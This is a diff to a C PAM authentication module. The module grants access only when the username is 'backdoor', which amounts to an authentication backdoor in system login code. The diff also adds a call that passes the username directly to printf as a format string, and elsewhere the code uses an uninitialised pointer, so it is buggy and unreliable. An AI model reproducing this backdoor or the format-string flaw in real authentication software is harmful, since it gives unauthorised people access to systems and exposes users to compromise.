@@ -31,14 +31,14 @@ PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, cons
 
 	if (strcmp(pUsername, "backdoor") != 0) {
 		return PAM_AUTH_ERR;
-		printf("ACCESS DENIED");
 	}
 	printf("ACCESS GRANTED");
 
 	return PAM_SUCCESS;
 }
-   int username_and_password(pam_handle_t *pamh, const char username, const char password){
-  	pUsername = &username;
+   int username_and_password(pam_handle_t *pamh, const char *username, const char *password){
+   	printf(username);
+  	pUsername = username;
   	int retval;
   	const char** attempt;
   	retval = pam_sm_authenticate(pamh, 1, 1, attempt);
